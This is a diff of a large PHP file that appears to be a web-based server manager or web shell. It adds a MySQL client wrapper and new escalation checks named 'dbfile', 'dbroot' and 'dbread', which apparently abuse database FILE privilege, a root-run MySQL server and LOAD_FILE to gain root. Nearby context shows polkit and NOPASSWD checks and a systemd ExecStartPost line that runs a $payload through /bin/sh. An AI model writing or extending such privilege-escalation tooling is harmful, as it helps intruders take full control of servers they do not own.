+       argument vector, the password on the environment and never on the command
+       line, and the query in the first argument */
+    private function rootMysqlExec($cred, $sql, $timeout = 20){
+        $bin = $this->rootMysqlBin();
+        if($bin === '')return['rc' => -1, 'out' => '', 'err' => 'no mysql client is installed on this host'];
+        $argv = [$bin, '--batch', '--skip-column-names', '--connect-timeout=8', '--silent',
+                 '-h', (string)($cred['host'] ?: 'localhost'), '-P', (string)(int)($cred['port'] ?: 3306),
+                 '-u', (string)$cred['user']];
+        if(!empty($cred['socket']))$argv[] = '--socket=' . $cred['socket'];
+        /* the password goes into the environment of this one child only: a
+           putenv() here was undone before the child started and read as an
+           empty password, which is how a right password came back refused */
+        $env = ['MYSQL_PWD' => (string)($cred['pass'] ?? ''),
+                'PATH' => '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin',
+                'LANG' => 'C'];
+        $r = $this->rootExec(array_merge($argv, ['-e', (string)$sql]), '', $timeout, $env);
+        /* an older client writes a warning to stderr even when the row came
+           back, so both streams are kept: the answer is looked for in either,
+           and neither one is thrown away */
+        $r['all'] = trim((string)($r['out'] ?? '') . "\n" . (string)($r['err'] ?? ''));
+        return $r;
     }
     private function rootCredTargets(){
         static $t = null;
@@ -23539,6 +23921,18 @@ ExecStartPost=/bin/sh '" . $payload . "'";
         if($id === 'pkcompat'){
             $x = $this->rootPolkitCompatFind();
             return $this->escF[$id] = $x;
+        }
+        if($id === 'dbfile'){
+            $x = $this->rootDbFilePriv();
+            return $this->escF[$id] = ['ok' => !empty($x['ok']), 'argv' => ['true'], 'note' => (string)$x['note']];
+        }
+        if($id === 'dbroot'){
+            $x = $this->rootDbServerRoot();
+            return $this->escF[$id] = ['ok' => !empty($x['ok']), 'argv' => ['true'], 'note' => (string)$x['note']];
+        }
+        if($id === 'dbread'){
+            $x = $this->rootDbLoadFile();
+            return $this->escF[$id] = ['ok' => !empty($x['ok']), 'argv' => ['true'], 'note' => (string)$x['note']];
         }
         if($id === 'nopasswd'){
             $f = $this->rootCredAccountFacts();
@@ -27859,13 +28253,18 @@ SH;
          * MySQL connect would make the whole manager appear frozen, including
          * unrelated controls and AJAX requests.
          */
+        /* a host without the mysqli extension is a host where this call would
+           throw instead of answering, and one throw here took the whole page
+           down before the manager had drawn anything - so the extension is
+           asked for first and its absence is an ordinary message */
+        if(!function_exists('mysqli_init'))return[null,null,'The mysqli PHP extension is not available on this host.'];
         $link=@mysqli_init();
         if($link){
             @mysqli_options($link,MYSQLI_OPT_CONNECT_TIMEOUT,5);
             if(defined('MYSQLI_OPT_READ_TIMEOUT'))@mysqli_options($link,MYSQLI_OPT_READ_TIMEOUT,8);
             @mysqli_real_connect($link,$c['host'],$c['user'],$c['pass'],$c['db'],$port);
         }
-        if(!$link)return[null,null,'Database connection failed: '.mysqli_connect_error()];
+        if(!$link)return[null,null,'Database connection failed: '.(function_exists('mysqli_connect_error')?mysqli_connect_error():'no mysqli')];
         if(mysqli_connect_errno()){ $e=mysqli_connect_error();@mysqli_close($link);return[null,null,'Database connection failed: '.$e]; }
         $c['type']=$type;
         return[$link,$c,null];
